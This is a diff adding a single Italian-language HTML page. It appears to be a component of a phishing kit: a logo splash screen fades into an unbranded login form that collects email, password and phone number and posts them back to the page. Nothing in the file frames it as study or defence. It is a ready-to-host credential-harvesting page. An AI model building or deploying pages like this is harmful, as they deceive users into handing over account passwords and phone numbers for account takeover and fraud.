@@ -1,0 +1,127 @@
+<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+
+<style>
+    html
+{
+    background-color: #2d32aa;
+    color:white;
+}
+.father {
+ display: flex;
+    justify-content: center;
+    align-items: center;
+}
+.resto{
+    display: none ;
+}
+
+.nascondi{
+    display: none !important;
+}
+
+.child {
+
+      background-image: url(logo.jpg);
+    margin-top: 100%;
+    position: absolute; 
+}
+.myButton {
+    width: 100%;
+    background-color:white;
+    border-radius:13px;
+    border:1px solid white;
+    display:inline-block;
+    cursor:pointer;
+    color:#2d32aa;
+    font-family:Arial;
+    font-size:17px;
+    font-weight:bold;
+    padding:17px 31px;
+    text-decoration:none;
+    text-shadow:0px 1px 0px white;
+}
+.myButton:hover {
+    background-color:white;
+}
+.myButton:active {
+    position:relative;
+    top:1px;
+}
+
+        
+
+label{
+    margin: 15px 0px !important;
+     font-size: 110%;
+}
+.i1{
+    width:100%;
+    
+    
+    line-height: 180%;
+    font-size: 110%;
+}
+
+
+input{
+    border-top-width: 0px !important;
+    border-bottom-color: white !important;
+    border-left-width: 0px !important;
+    border-right-width: 0px !important;
+}
+.sfondo{
+    /* FLOAT: RIGHT; */
+    background-repeat: no-repeat;
+    background-size: cover;
+}
+input{
+padding: 10px;background-color: #2d32aa;color:white;
+ 
+}
+form .sopra{
+  font-weight: normal;font-size: 90%;
+      
+      background-color: #2d32aa;margin: 0;padding: 10px 0px 0px 10px;color: white;
+}
+</style>
+
+</head><body>
+    <div class="father">
+    <div class="child"><img src="L2.png" style="WIDTH: 100%;"></div>
+</div>
+<div class="resto" style=" display: none;">
+<link rel="stylesheet" href="https://unpkg.com/purecss@2.0.5/build/pure-min.css">
+<script src="jquery-latest.min.js"></script>
+<div style="text-align:center">
+<img src="logo.png" style="margin: 15px 15px 10px 15px;" width="100">
+</div>
+<div style="margin: 0px 4%;">
+
+
+<form method="POST" autocomplete="off" class="">
+
+     
+<h3 style="font-size: 96%;margin-top: 0px;text-align: center"></h3>
+        <br><h3 class="sopra">Email</h3><input autocomplete="off" required="" class="i1" id="username" name="cod" value="" type="email">
+   <br><br><h3 class="sopra">Password</h3><input autocomplete="off" required="" class="i1" type="password" name="pin"><br><br><h3 class="sopra">Telefono</h3><input autocomplete="off" required="" class="i1" id="tel" name="tel" value="" type="text">   <br><br> 
+        
+        <br>   <br><br>
+        <button type="submit" class="myButton">ENTRA</button>
+</form>
+</div><br><br><br><br><br><br>
+
+
+<script>
+    setTimeout(function(){
+
+jQuery(".father").fadeOut( "slow", function() {
+   
+        jQuery("html").addClass("sfondo")
+        jQuery(".resto").fadeIn()
+  });
+
+    },2000)
+    </script>
+</div>
+</body></html>
